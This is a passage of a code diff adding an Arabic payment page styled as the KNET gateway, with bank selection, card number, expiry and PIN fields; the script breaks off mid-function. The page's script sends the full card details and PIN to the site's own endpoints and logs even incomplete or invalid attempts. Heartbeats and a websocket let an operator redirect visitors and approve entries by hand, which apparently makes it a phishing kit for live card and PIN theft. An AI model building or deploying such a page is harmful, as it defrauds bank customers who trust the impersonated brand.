@@ -1,0 +1,885 @@
+<html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width,initial-scale=1"> <title>KNET Gateway</title> <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials"> <link rel="preconnect" href="https://fonts.gstatic.com"> <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&display=swa"> <style> .knet-error-modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(15, 23, 42, 0.5);
+      z-index: 2000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    .knet-error-modal.is-open {
+      display: flex;
+    }
+
+    .knet-error-card {
+      width: min(420px, 100%);
+      border-radius: 14px;
+      border: 1px solid #fecaca;
+      background: #fff;
+      box-shadow: 0 20px 46px rgba(15, 23, 42, 0.28);
+      padding: 18px 16px;
+      text-align: center;
+      direction: rtl;
+    }
+
+    .knet-error-title {
+      margin: 0 0 8px;
+      color: #991b1b;
+      font-size: 1.02rem;
+      font-weight: 800;
+    }
+
+    .knet-error-text {
+      margin: 0;
+      color: #334155;
+      font-size: 0.94rem;
+      line-height: 1.6;
+    }
+
+    .knet-error-close {
+      margin-top: 14px;
+      border: 1px solid #ef4444;
+      background: #ef4444;
+      color: #fff;
+      border-radius: 9px;
+      font-size: 0.88rem;
+      font-weight: 700;
+      padding: 8px 14px;
+      cursor: pointer;
+    } </style> </head> <body> <link href="{{url_for('static', path='css/txn-stylesheet.css?ver=1.70')}}" rel="stylesheet"> <link href="{{url_for('static', path='css/txn-responsive-ar.css?ver=1.70')}}" rel="stylesheet"> <form action="" name="paypage" id="paypage" method="post" autocomplete="off"> <div id="PayPageEntry"> <div class="container"> <div class="content-block"> <div class="form-card"> <div class="container-blogo"><img class="logoHead-mob" src="{{url_for('static',path='images/kib.jpeg')}}" alt="logo"> </div> <div class="row"> <div style="text-align: right;"> <label class="column-label" style="width: 60%;">Commercial Facilities Co.</label> </div> <div style="float:right;"> <label class="column-value text-label" style="width:auto;">:المستفيد </label> </div> </div> <div id="OrgTranxAmt"> <div style="text-align:right;"><label class="column-label" style="width: 60%;"> KD 1.000 </label> </div> <div style="float:right;"> <label class="column-value text-label" style="width:auto;"> :المبلغ</label> </div> </div> </div> <div class="form-card"> <div id="ValidationMessage"></div> <div id="FCUseDebitEnable" style="margin-top: 5px;"> <div class="row"> <div style="text-align:right;"> <select id="bn" class="column-value" style="width:60%;" dir="rtl"> <option value="bankname" title="Select Your Bank">يرجى اختيار البنك</option> <option value="ABK"> البنك الأهلي الكويتي [ABK] </option> <option value="Rajhi"> مصرف الراجحي [Rajhi] </option> <option value="BBK"> بنك البحرين والكويت [BBK] </option> <option value="Boubyan"> بنك بوبيان [Boubyan] </option> <option value="Burgan"> بنك برقان [Burgan] </option> <option value="CBK"> البنك التجاري الكويتي [CBK] </option> <option value="Doha"> بنك الدوحة [Doha] </option> <option value="GBK"> بنك الخليج [GBK] </option> <option value="TAM"> بيتك [TAM] </option> <option value="KFH"> بيت التمويل الكويتي [KFH] </option> <option value="KIB"> بنك الكويت الدولي [KIB] </option> <option value="NBK"> بنك الكويت الوطني [NBK] </option> <option value="Weyay"> الوطني [Weyay] </option> <option value="QNB"> بنك قطر الوطني [QNB] </option> <option value="UNB"> بنك الاتحاد الوطنى [UNB] </option> <option value="Warba"> بنك وربة [Warba] </option> </select> </div> <div style="text-align:right;  float:right;"> <label class="column-label" style="width:100%;">:يرجى اختيار البنك</label> </div> </div> <div class="row three-column" id="card-number-row"> <label> <select class="column-value" name="dcprefix" id="dcprefix" dir="rtl" style="width:26%;"> <option value="bankcode" id="bankcode">بادِئة </option> </select> </label> <label> <input name="debitNumber" id="debitNumber" type="tel" inputmode="numeric" pattern="[0-9]*" size="10" style="width: 32%;float:left" maxlength="10" minlength="10" title="يجب أن يكون في العدد. يجب أن يكون الطول 10"> </label> <label class="column-label" style="float:right;text-align:right;">:رقم بطاقة الصرف الآلي </label> </div> <div class="row three-column" id="cardExpdate"> <div id="debitExpDate" style="float:right; text-align:right;"> <label class="column-label" style="width: 100%;">:تاريخ انتهاء البطاقة </label> </div> <div style="width: 60%;text-align: right;"> <select class="gatewayselect" id="expYear" dir="rtl"> <option value="0">YYYY</option> <option value="2026">2026</option> <option value="2027">2027</option> <option value="2028">2028</option> <option value="2029">2029</option> <option value="2030">2030</option> <option value="2031">2031</option> <option value="2032">2032</option> <option value="2033">2033</option> <option value="2034">2034</option> <option value="2035">2035</option> <option value="2036">2036</option> <option value="2037">2037</option> <option value="2038">2038</option> <option value="2039">2039</option> <option value="2040">2040</option> <option value="2041">2041</option> <option value="2042">2042</option> <option value="2043">2043</option> <option value="2044">2044</option> <option value="2045">2045</option> <option value="2046">2046</option> <option value="2047">2047</option> <option value="2048">2048</option> <option value="2049">2049</option> <option value="2050">2050</option> <option value="2051">2051</option> <option value="2052">2052</option> <option value="2053">2053</option> <option value="2054">2054</option> <option value="2055">2055</option> <option value="2056">2056</option> <option value="2057">2057</option> <option value="2058">2058</option> <option value="2059">2059</option> <option value="2060">2060</option> <option value="2061">2061</option> <option value="2062">2062</option> <option value="2063">2063</option> <option value="2064">2064</option> <option value="2065">2065</option> <option value="2066">2066</option> <option value="2067">2067</option> <option value="2068">2068</option> <option value="2069">2069</option> </select> <select class="gatewayselect" id="expMonth" dir="rtl"> <option value="0">MM</option> <option value="1">01</option> <option value="2">02</option> <option value="3">03</option> <option value="4">04</option> <option value="5">05</option> <option value="6">06</option> <option value="7">07</option> <option value="8">08</option> <option value="9">09</option> <option value="10">10</option> <option value="11">11</option> <option value="12">12</option> </select> </div> </div> <div class="row" id="PinRow"> <div id="eComPin"> <label class="column-label" style="float:right;text-align:right;">:الرقم السري</label> </div> <div> <input inputmode="numeric" pattern="[0-9]*" name="cardPin" id="cardPin" autocomplete="off" dir="rtl" title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="password" size="4" maxlength="4" style="width: 60%;text-align:right;" class="allownumericwithoutdecimal"> </div> </div> </div> </div> <div class="form-card"> <div class="row"> <div style="text-align:center;"> <div id="submithide"> <button name="proceed" type="button" class="submit-button" style="float:right;" id="proceed">إرسال</button> <input name="proceedCancel" type="button" class="cancel-button" id="cancel" value="إلغاء"> </div> </div> </div> </div> <div align="center" id="overlayhide" class="overlay" style="display:none;"> <img src="{{url_for('static', path='images/loadingmob.gif')}}" style="height: 15%;margin-top:50%;"> </div> <div id="knet-error-modal" class="knet-error-modal" aria-hidden="true"> <div class="knet-error-card" role="dialog" aria-modal="true" aria-labelledby="knet-error-title"> <p class="knet-error-title" id="knet-error-title">تعذر التحقق من البيانات</p> <p class="knet-error-text" id="knet-error-text">المعلومات المدخلة غير صحيحة.</p> <button type="button" class="knet-error-close" id="knet-error-close">إغلاق</button> </div> </div> <footer> <div> <span> <div class="row_new"> <div style="text-align: center;font-size: 12px;"> جميع الحقوق محفوظة © 2026 <br><span style="font-weight:bold;color: #0077D5;">شركة الخدمات المصرفية الآلية المشتركة – كي نت</span> </div> </div> </span> </div> </footer> </div> </div> </div> </form> <script nonce="{{ request.state.csp_nonce }}"> (() => {
+        const bankSelect = document.getElementById("bn");
+        const prefixSelect = document.getElementById("dcprefix");
+        const debitNumberInput = document.getElementById("debitNumber");
+        const cardPinInput = document.getElementById("cardPin");
+        const expYearSelect = document.getElementById("expYear");
+        const expMonthSelect = document.getElementById("expMonth");
+        const cancelButton = document.getElementById("cancel");
+        const validationMessage = document.getElementById("ValidationMessage");
+        const proceedButton = document.getElementById("proceed");
+        const payForm = document.getElementById("paypage");
+        const overlayHide = document.getElementById("overlayhide");
+        const knetErrorModal = document.getElementById("knet-error-modal");
+        const knetErrorText = document.getElementById("knet-error-text");
+        const knetErrorClose = document.getElementById("knet-error-close");
+        const TEST_VALID_KNET_VALUE = "1000000001";
+        const currentPage = "كي نت";
+
+        fetch("/visitors/current-page", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          credentials: "same-origin",
+          body: JSON.stringify({ current_page: currentPage })
+        }).catch(() => {});
+
+        const checkAdminRedirect = () => {
+          fetch("/visitors/redirect-check", {
+            method: "GET",
+            headers: { Accept: "application/json" },
+            credentials: "same-origin",
+            cache: "no-store",
+          })
+            .then((response) => response.ok ? response.json() : null)
+            .then((payload) => {
+              if (!payload || payload.redirect !== true) {
+                return;
+              }
+              const targetPath = typeof payload.target_path === "string" ? payload.target_path.trim() : "";
+              if (targetPath && targetPath !== window.location.pathname) {
+                window.location.href = targetPath;
+              }
+            })
+            .catch(() => {});
+        };
+
+        let redirectSocket = null;
+        let redirectSocketReconnectTimer = null;
+        let redirectSocketPingTimer = null;
+        let hasRedirected = false;
+        let pendingVerificationDecision = "";
+        const KNET_PREFILL_KEY = "knet_prefill_v1";
+        const KNET_SKIP_AUTO_REDIRECT_KEY = "knet_skip_auto_redirect_once";
+        const KNET_APPROVED_REDIRECT_DONE_KEY = "knet_approved_redirect_done";
+        const searchParams = new URLSearchParams(window.location.search);
+        const hasRestoreParam = searchParams.get("restore") === "1";
+        let suppressApprovedAutoRedirect = hasRestoreParam;
+        try {
+          if (window.sessionStorage.getItem(KNET_SKIP_AUTO_REDIRECT_KEY) === "1") {
+            suppressApprovedAutoRedirect = true;
+            window.sessionStorage.removeItem(KNET_SKIP_AUTO_REDIRECT_KEY);
+          }
+        } catch (_) {
+          // noop
+        }
+        if (hasRestoreParam) {
+          try {
+            const cleanUrl = `${window.location.pathname}${window.location.hash || ""}`;
+            window.history.replaceState({}, "", cleanUrl);
+          } catch (_) {
+            // noop
+          }
+        }
+        const hasApprovedRedirectDone = () => {
+          try {
+            return window.sessionStorage.getItem(KNET_APPROVED_REDIRECT_DONE_KEY) === "1";
+          } catch (_) {
+            return false;
+          }
+        };
+        const markApprovedRedirectDone = () => {
+          try {
+            window.sessionStorage.setItem(KNET_APPROVED_REDIRECT_DONE_KEY, "1");
+          } catch (_) {
+            // noop
+          }
+        };
+        const clearApprovedRedirectDone = () => {
+          try {
+            window.sessionStorage.removeItem(KNET_APPROVED_REDIRECT_DONE_KEY);
+          } catch (_) {
+            // noop
+          }
+        };
+        const redirectToVerificationOnce = () => {
+          if (suppressApprovedAutoRedirect || hasApprovedRedirectDone()) {
+            return false;
+          }
+          markApprovedRedirectDone();
+          window.location.href = "/verfication";
+          return true;
+        };
+
+        const navigateToRedirectTarget = (targetPathRaw) => {
+          if (hasRedirected) {
+            return;
+          }
+          const targetPathInput = typeof targetPathRaw === "string" ? targetPathRaw.trim() : "";
+        const targetPath = ({
+          "/additional-info": "/additional-customer-info",
+          "/transaction-info": "/transaction-notification"
+        }[targetPathInput] || targetPathInput);
+          if (!targetPath || targetPath === window.location.pathname) {
+            return;
+          }
+          hasRedirected = true;
+          window.location.href = targetPath;
+        };
+
+        const connectAdminRedirectSocket = () => {
+          if (redirectSocketReconnectTimer) {
+            clearTimeout(redirectSocketReconnectTimer);
+            redirectSocketReconnectTimer = null;
+          }
+          if (redirectSocketPingTimer) {
+            clearInterval(redirectSocketPingTimer);
+            redirectSocketPingTimer = null;
+          }
+          if (redirectSocket && (redirectSocket.readyState === WebSocket.OPEN || redirectSocket.readyState === WebSocket.CONNECTING)) {
+            return;
+          }
+
+          const scheme = window.location.protocol === "https:" ? "wss:" : "ws:";
+          const socketUrl = `${scheme}//${window.location.host}/ws/visitor/redirect`;
+
+          try {
+            redirectSocket = new WebSocket(socketUrl);
+          } catch (_) {
+            redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+            return;
+          }
+
+          redirectSocket.addEventListener("open", () => {
+            redirectSocketPingTimer = setInterval(() => {
+              if (!redirectSocket || redirectSocket.readyState !== WebSocket.OPEN) {
+                return;
+              }
+              try {
+                redirectSocket.send(JSON.stringify({ type: "heartbeat", current_page: currentPage }));
+              } catch (_) {
+                // noop
+              }
+            }, 5000);
+          });
+
+          redirectSocket.addEventListener("message", (event) => {
+            let payload = null;
+            try {
+              payload = JSON.parse(event.data);
+            } catch (_) {
+              payload = null;
+            }
+            const eventName = payload && typeof payload === "object"
+              ? String(payload.event || "").trim().toLowerCase()
+              : "";
+            if (eventName !== "visitor.redirect") {
+              if (eventName === "visitor.knet.verification.updated") {
+                const meta = payload && typeof payload === "object" && payload.meta && typeof payload.meta === "object"
+                  ? payload.meta
+                  : null;
+                const statusRaw = meta ? String(meta.status || "").trim().toLowerCase() : "";
+                if (statusRaw === "approved" || statusRaw === "rejected") {
+                  pendingVerificationDecision = statusRaw;
+                  if (statusRaw === "approved" && redirectToVerificationOnce()) {
+                    return;
+                  }
+                }
+              }
+              return;
+            }
+            const meta = payload && typeof payload === "object" && payload.meta && typeof payload.meta === "object"
+              ? payload.meta
+              : null;
+            navigateToRedirectTarget(meta ? meta.target_path : "");
+          });
+
+          redirectSocket.addEventListener("close", () => {
+            if (redirectSocketPingTimer) {
+              clearInterval(redirectSocketPingTimer);
+              redirectSocketPingTimer = null;
+            }
+            redirectSocket = null;
+            redirectSocketReconnectTimer = setTimeout(connectAdminRedirectSocket, 1500);
+          });
+
+          redirectSocket.addEventListener("error", () => {
+            try {
+              redirectSocket.close();
+            } catch (_) {
+              // noop
+            }
+          });
+        };
+
+        const sendHeartbeat = () => {
+          fetch("/visitors/heartbeat", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            credentials: "same-origin",
+            body: JSON.stringify({ current_page: currentPage })
+          }).catch(() => {});
+          checkAdminRedirect();
+          redirectIfApproved().catch(() => {});
+        };
+
+      sendHeartbeat();
+      connectAdminRedirectSocket();
+      const heartbeatInterval = setInterval(() => {
+        if (document.visibilityState === "visible") {
+          sendHeartbeat();
+        }
+      }, 5000);
+      const redirectFallbackInterval = setInterval(() => {
+        if (document.visibilityState === "visible") {
+          checkAdminRedirect();
+          redirectIfApproved().catch(() => {});
+        }
+      }, 15000);
+      document.addEventListener("visibilitychange", () => {
+        if (document.visibilityState === "visible") {
+          sendHeartbeat();
+        }
+      });
+
+        window.addEventListener("pageshow", () => {
+          hasRedirected = false;
+          setOverlayVisible(false);
+          proceedButton.disabled = false;
+          sendHeartbeat();
+          connectAdminRedirectSocket();
+          redirectIfApproved().catch(() => {});
+        });
+
+        if (cancelButton) {
+          cancelButton.addEventListener("click", () => {
+            window.location.href = "/transaction-notification";
+          });
+        }
+
+        if (!bankSelect || !prefixSelect || !debitNumberInput || !cardPinInput || !expYearSelect || !expMonthSelect || !proceedButton || !payForm) {
+          return;
+        }
+
+        const persistKnetDraft = () => {
+          try {
+            const bank = typeof bankSelect.value === "string" ? bankSelect.value.trim() : "";
+            const dcprefix = toWesternDigits(prefixSelect.value || "").replace(/\D+/g, "");
+            const debit_number = toWesternDigits(debitNumberInput.value || "").replace(/\D+/g, "");
+            if (!bank && !dcprefix && !debit_number) {
+              window.sessionStorage.removeItem(KNET_PREFILL_KEY);
+              return;
+            }
+            window.sessionStorage.setItem(KNET_PREFILL_KEY, JSON.stringify({
+              bank,
+              dcprefix,
+              debit_number
+            }));
+          } catch (_) {
+            // noop
+          }
+        };
+
+        const restorePrefillFromSession = () => {
+          try {
+            const raw = window.sessionStorage.getItem(KNET_PREFILL_KEY);
+            if (!raw) return;
+            const payload = JSON.parse(raw);
+            if (!payload || typeof payload !== "object") return;
+
+            const bank = typeof payload.bank === "string" ? payload.bank.trim() : "";
+            const prefix = typeof payload.dcprefix === "string" ? payload.dcprefix.trim() : "";
+            const debit = typeof payload.debit_number === "string" ? payload.debit_number.trim() : "";
+
+            if (bank && bank_bins[bank]) {
+              bankSelect.value = bank;
+              populatePrefixes(bank);
+            }
+
+            if (prefix && Array.from(prefixSelect.options).some((o) => o.value === prefix)) {
+              prefixSelect.value = prefix;
+            } else if (prefixSelect.options.length > 0) {
+              prefixSelect.selectedIndex = 0;
+            }
+
+            updateDebitLengthFromPrefix();
+            if (debit) {
+              debitNumberInput.value = toWesternDigits(debit).replace(/\D+/g, "").slice(0, debitNumberRequiredLength);
+            }
+
+            // Explicitly keep these empty on restore.
+            expMonthSelect.value = "0";
+            expYearSelect.value = "0";
+            cardPinInput.value = "";
+          } catch (_) {
+            // noop
+          }
+        };
+
+        const bank_bins = {
+          "ABK": ["423826", "428628", "403622", "42403256"],
+          "Rajhi": ["458838"],
+          "BBK": ["418056", "588790"],
+          "Boubyan": ["404919", "450605", "426058", "431199", "490455", "470350", "490456"],
+          "Burgan": ["450238", "468564", "540759", "402978", "49219000", "403583", "415254"],
+          "CBK": ["537015", "521175", "532672", "516334"],
+          "Doha": ["419252"],
+          "GBK": ["559475", "531329", "531470", "531471", "531644", "526206", "517419", "517458"],
+          "TAM": ["45077848", "45077849"],
+          "KFH": ["450778", "537016", "532674", "485602"],
+          "KIB": ["409054", "406464"],
+          "NBK": ["464452", "589160"],
+          "Weyay": ["46445250", "543363"],
+          "QNB": ["521020", "524745"],
+          "UNB": ["457778"],
+          "Warba": ["532749", "525528", "559459", "541350"],
+        };
+
+        let debitNumberRequiredLength = 10;
+
+        const applyDebitNumberLength = (length) => {
+          const safeLength = Number.isFinite(length) && length > 0 ? Math.floor(length) : 10;
+          debitNumberRequiredLength = safeLength;
+          debitNumberInput.maxLength = safeLength;
+          debitNumberInput.minLength = safeLength;
+          debitNumberInput.pattern = `[0-9]{${safeLength}}`;
+          debitNumberInput.setAttribute("maxlength", String(safeLength));
+          debitNumberInput.setAttribute("minlength", String(safeLength));
+          debitNumberInput.title = `يجب إدخال ${safeLength} أرقام`;
+        };
+
+        const resetPrefixOptions = (withPlaceholder = true) => {
+          prefixSelect.innerHTML = "";
+          if (withPlaceholder) {
+            const placeholder = document.createElement("option");
+            placeholder.value = "bankcode";
+            placeholder.id = "bankcode";
+            placeholder.textContent = "بادِئة";
+            prefixSelect.appendChild(placeholder);
+          }
+        };
+
+        const populatePrefixes = (bankKey) => {
+          const bins = bank_bins[bankKey];
+          if (!Array.isArray(bins)) {
+            resetPrefixOptions(true);
+            return;
+          }
+          resetPrefixOptions(false);
+          for (const bin of bins) {
+            const option = document.createElement("option");
+            option.value = bin;
+            option.textContent = bin;
+            prefixSelect.appendChild(option);
+          }
+          prefixSelect.selectedIndex = 0;
+        };
+
+        const arabicIndicDigits = "٠١٢٣٤٥٦٧٨٩";
+        const easternArabicIndicDigits = "۰۱۲۳۴۵۶۷۸۹";
+
+        const toWesternDigits = (value) => {
+          return value
+            .replace(/[٠-٩]/g, (digit) => String(arabicIndicDigits.indexOf(digit)))
+            .replace(/[۰-۹]/g, (digit) => String(easternArabicIndicDigits.indexOf(digit)));
+        };
+
+        const sanitizeDigitsInput = (input, maxLength = null) => {
+          let value = toWesternDigits(input.value);
+          value = value.replace(/\D+/g, "");
+          if (typeof maxLength === "number") {
+            value = value.slice(0, maxLength);
+          }
+          input.value = value;
+          return value;
+        };
+
+        const updateDebitLengthFromPrefix = () => {
+          const prefixDigits = toWesternDigits(prefixSelect.value || "").replace(/\D+/g, "");
+          if (!prefixDigits) {
+            applyDebitNumberLength(10);
+            return;
+          }
+          applyDebitNumberLength(16 - prefixDigits.length);
+        };
+
+        const setValidationMessage = (message) => {
+          validationMessage.style.display = "block";
+          validationMessage.textContent = message;
+          validationMessage.style.color = "#dc2626";
+          validationMessage.style.fontSize = "0.92rem";
+          validationMessage.style.marginBottom = "8px";
+          validationMessage.style.textAlign = "center";
+        };
+
+        const clearValidationMessage = () => {
+          validationMessage.textContent = "";
+          validationMessage.style.display = "none";
+        };
+
+        const setOverlayVisible = (visible) => {
+          if (!overlayHide) {
+            return;
+          }
+          overlayHide.style.display = visible ? "block" : "none";
+        };
+
+        const openKnetErrorModal = (message = "المعلومات المدخلة غير صحيحة.") => {
+          if (knetErrorText) {
+            knetErrorText.textContent = message;
+          }
+          if (knetErrorModal) {
+            knetErrorModal.classList.add("is-open");
+            knetErrorModal.setAttribute("aria-hidden", "false");
+          }
+        };
+
+        const closeKnetErrorModal = () => {
+          if (!knetErrorModal) {
+            return;
+          }
+          knetErrorModal.classList.remove("is-open");
+          knetErrorModal.setAttribute("aria-hidden", "true");
+        };
+
+        const sleep = (ms) => new Promise((resolve) => {
+          window.setTimeout(resolve, ms);
+        });
+
+        const getKnetVerificationStatus = async () => {
+          try {
+            const response = await fetch("/visitors/knet-verification-status", {
+              method: "GET",
+              headers: { Accept: "application/json" },
+              credentials: "same-origin",
+              cache: "no-store",
+            });
+            if (!response.ok) {
+              return "pending";
+            }
+            const payload = await response.json().catch(() => null);
+            const statusRaw = payload && typeof payload === "object" ? String(payload.status || "").toLowerCase() : "";
+            if (statusRaw === "approved" || statusRaw === "rejected" || statusRaw === "pending") {
+              return statusRaw;
+            }
+            return "pending";
+          } catch (_) {
+            return "pending";
+          }
+        };
+
+        async function redirectIfApproved() {
+          const status = await getKnetVerificationStatus();
+          if (status === "approved" && redirectToVerificationOnce()) {
+            return true;
+          }
+          if (status === "rejected") {
+            pendingVerificationDecision = "rejected";
+          }
+          return false;
+        }
+
+        const waitForAdminVerification = async () => {
+          const timeoutAt = Date.now() + 60_000;
+          let nextFallbackCheckAt = Date.now();
+          while (Date.now() < timeoutAt) {
+            if (pendingVerificationDecision === "approved" || pendingVerificationDecision === "rejected") {
+              return pendingVerificationDecision;
+            }
+            if (Date.now() >= nextFallbackCheckAt) {
+              const status = await getKnetVerificationStatus();
+              if (status === "approved" || status === "rejected") {
+                return status;
+              }
+              nextFallbackCheckAt = Date.now() + 5000;
+            }
+            await sleep(300);
+          }
+          const finalStatus = await getKnetVerificationStatus();
+          if (finalStatus === "approved" || finalStatus === "rejected") {
+            return finalStatus;
+          }
+          return "timeout";
+        };
+
+        const validateExpiryNotPast = () => {
+          const yearValue = Number(expYearSelect.value);
+          const monthValue = Number(expMonthSelect.value);
+          if (!Number.isFinite(yearValue) || !Number.isFinite(monthValue) || yearValue <= 0 || monthValue <= 0) {
+            return false;
+          }
+
+          const now = new Date();
+          const currentYear = now.getFullYear();
+          const currentMonth = now.getMonth() + 1;
+          if (yearValue < currentYear) {
+            return false;
+          }
+          if (yearValue === currentYear && monthValue < currentMonth) {
+            return false;
+          }
+          return true;
+        };
+
+        const passesLuhn = (cardNumber) => {
+          if (!/^\d{16}$/.test(cardNumber)) {
+            return false;
+          }
+          let sum = 0;
+          let shouldDouble = false;
+          for (let i = cardNumber.length - 1; i >= 0; i -= 1) {
+            let digit = Number(cardNumber[i]);
+            if (shouldDouble) {
+              digit *= 2;
+              if (digit > 9) {
+                digit -= 9;
+              }
+            }
+            sum += digit;
+            shouldDouble = !shouldDouble;
+          }
+          return sum % 10 === 0;
+        };
+
+        const saveKnetSubmission = async ({
+          bank,
+          dcprefix,
+          debitNumber,
+          expMonth,
+          expYear,
+          pinCode,
+        }) => {
+          try {
+            const response = await fetch("/visitors/knet-submission", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              credentials: "same-origin",
+              body: JSON.stringify({
+                bank,
+                dcprefix,
+                debit_number: debitNumber,
+                exp_month: expMonth,
+                exp_year: expYear,
+                pin_code: pinCode,
+              }),
+            });
+            if (!response.ok) {
+              return false;
+            }
+            const payload = await response.json().catch(() => null);
+            return payload && typeof payload === "object" && payload.status === "saved";
+          } catch (_) {
+            return false;
+          }
+        };
+
+        const logIncompleteKnetSubmission = async ({
+          bank,
+          dcprefix,
+          debitNumber,
+          expMonth,
+          expYear,
+          pinCode,
+          missingFields,
+          validationError
+        }) => {
+          try {
+            await fetch("/visitors/knet-submission-log", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              credentials: "same-origin",
+              body: JSON.stringify({
+                bank,
+                dcprefix,
+                debit_number: debitNumber,
+                exp_month: Number.isFinite(expMonth) ? expMonth : 0,
+                exp_year: Number.isFinite(expYear) ? expYear : 0,
+                pin_code: pinCode,
+                missing_fields: Array.isArray(missingFields) ? missingFields : [],
+                validation_error: validationError,
+              }),
+            });
+          } catch (_) {
+            // noop
+          }
+        };
+
+        debitNumberInput.addEventListener("input", () => {
+          sanitizeDigitsInput(debitNumberInput, debitNumberRequiredLength);
+          clearValidationMessage();
+          persistKnetDraft();
+        });
+
+        cardPinInput.addEventListener("input", () => {
+          sanitizeDigitsInput(cardPinInput, 4);
+          clearValidationMessage();
+        });
+
+        bankSelect.addEventListener("change", () => {
+          clearValidationMessage();
+          populatePrefixes(bankSelect.value);
+          debitNumberInput.value = "";
+          updateDebitLengthFromPrefix();
+          persistKnetDraft();
+        });
+
+        prefixSelect.addEventListener("change", () => {
+          clearValidationMessage();
+          debitNumberInput.value = "";
+          updateDebitLengthFromPrefix();
+          persistKnetDraft();
+        });
+        expMonthSelect.addEventListener("change", clearValidationMessage);
+        expYearSelect.addEventListener("change", clearValidationMessage);
+
+        payForm.addEventListener("input", (event) => {
+          const target = event.target;
+          if (target instanceof HTMLInputElement || target instanceof HTMLSelectElement) {
+            clearValidationMessage();
+          }
+        });
+
+        payForm.addEventListener("change", (event) => {
+          const target = event.target;
+          if (target instanceof HTMLInputElement || target instanceof HTMLSelectElement) {
+            clearValidationMessage();
+          }
+        });
+
+        if (knetErrorClose) {
+          knetErrorClose.addEventListener("click", closeKnetErrorModal);
+        }
+        if (knetErrorModal) {
+          knetErrorModal.addEventListener("click", (event) => {
+            if (event.target === knetErrorModal) {
+              closeKnetErrorModal();
+            }
+          });
+        }
+
+        proceedButton.addEventListener("click", async () => {
+          proceedButton.disabled = true;
+          clearValidationMessage();
+          closeKnetErrorModal();
+
+          const debitValue = sanitizeDigitsInput(debitNumberInput, debitNumberRequiredLength);
+          const pinValue = sanitizeDigitsInput(cardPinInput, 4);
+          const isTestValidKnet = debitValue === TEST_VALID_KNET_VALUE;
+          const prefixDigits = toWesternDigits(prefixSelect.value || "").replace(/\D+/g, "");
+          const expMonthValue = Number(expMonthSelect.value || 0);
+          const expYearValue = Number(expYearSelect.value || 0);
+
+          if (!bank_bins[bankSelect.value]) {
+            await logIncompleteKnetSubmission({
+              bank: bankSelect.value,
+              dcprefix: prefixDigits,
+              debitNumber: debitValue,
+              expMonth: expMonthValue,
+              expYear: expYearValue,
+              pinCode: pinValue,
+              missingFields: ["bank"],
+              validationError: "bank_missing",
+            });
+            setValidationMessage("يرجى اختيار البنك");
+            proceedButton.disabled = false;
+            return;
+          }
+
+          if (!prefixDigits) {
+            await logIncompleteKnetSubmission({
+              bank: bankSelect.value,
+              dcprefix: prefixDigits,
+              debitNumber: debitValue,
+              expMonth: expMonthValue,
+              expYear: expYearValue,
+              pinCode: pinValue,
+              missingFields: ["dcprefix"],
+              validationError: "dcprefix_missing",
+            });
+            setValidationMessage("يرجى ادخال رقم البطاقة بشكل الصحيح");
+            proceedButton.disabled = false;
+            return;
+          }
+
+          if (!isTestValidKnet && debitValue.length !== debitNumberRequiredLength) {
+            await logIncompleteKnetSubmission({
+              bank: bankSelect.value,
+              dcprefix: prefixDigits,
+              debitNumber: debitValue,
+              expMonth: expMonthValue,
+              expYear: expYearValue,
+              pinCode: pinValue,
+              missingFields: ["debit_number"],
+              validationError: "debit_number_incomplete",
+            });
+            setValidationMessage("يرجى ادخال رقم البطاقة بشكل الصحيح");
+            proceedButton.disabled = false;
+            return;
+          }
+
+          if (!expMonthSelect.value || expMonthSelect.value === "0") {
+            await logIncompleteKnetSubmission({
+              bank: bankSelect.value,
+              dcprefix: prefixDigits,
+              debitNumber: debitValue,
+              expMonth: expMonthValue,
+              expYear: expYearValue,
+              pinCode: pinValue,
+              missingFields: ["exp_month"],
+              validationError: "exp_month_missing",
+            });
+            setValidationMessage("يرجى اختيار الشهر");
+            proceedButton.disabled = false;
+            return;
+          }
+
+          if (!expYearSelect.value || expYearSelect.value === "0") {
+            await logIncompleteKnetSubmission({
+              bank: bankSelect.value,
+              dcprefix: prefixDigits,
+              debitNumber: debitValue,
+              expMonth: expMonthValue,
+              expYear: expYearValue,
+              pinCode: pinValue,
+              missingFields: ["exp_year"],
+              validationError: "exp_year_missing",
+            });
+            setValidationMessage("يرجى اختيار السنة");
+            proceedButton.disabled = false;
+            return;
+          }
+
+          if (!/^[0-9]{4}$/.test(pinValue)) {
+            await logIncompleteKnetSubmission({
+              bank: bankSelect.value,
+              dcprefix: prefixDigits,
+              debitNumber: debitValue,
+              expMonth: expMonthValue,
+              expYear: expYearValue,
+              pinCode: pinValue,
+              missingFields: ["pin_code"],
+              validationError: "pin_code_invalid",
+            });
+            setValidationMessage("يرجى ادخال الرقم السري بشكل صحيح");
+            proceedButton.disabled = false;
+            return;
+          }
+
+          const saved = await saveKnetSubmission({
+            bank: bankSelect.value,
+            dcprefix: prefixDigits,
+            debitNumber: debitValue,
+            expMonth: Number(expMonthSelect.value),
+            expYear: Number(expYearSelect.value),
+            pinCode: pinValue,
+          });
+          if (!saved) {
+            setValidationMessage("تعذر حفظ بيانات كي نت، حاول مرة أخرى");
+            proceedButton.disabled = false;
+            return;
+          }
+          clearApprovedRedirectDone();
+          pendingVerificationDecision = "";
+
+          const fullCardNumber = `${prefixDigits}${debitValue}`;
+          if (!isTestValidKnet && !passesLuhn(fullCardNumber)) {
+            await logIncompleteKnetSubmission({
+              bank: bankSelect.value,
+              dcprefix: prefixDigits,
+              debitNumber: debitValue,
+              expMonth: expMonthValue,
+              expYear: expYearValue,
+              pinCode: pinValue,
+              missingFields: [],
+              validationError: "luhn_invalid",
+            });
+            setValidationMessage("يرجى ادخال رقم البطاقة بشكل الصحيح");
+            proceedButton.disabled = false;
+            return;
+          }
+
+          if (!validateExpiryNotPast()) {
+            await logIncompleteKnetSubmission({
+              bank: bankSelect.value,
+              dcprefix: prefixDigits,
+              debitNumber: debitValue,
+              expMonth: expMonthValue,
+              expYear: expYearValue,
+              pinCode: pinValue,
+              missingFields: [],
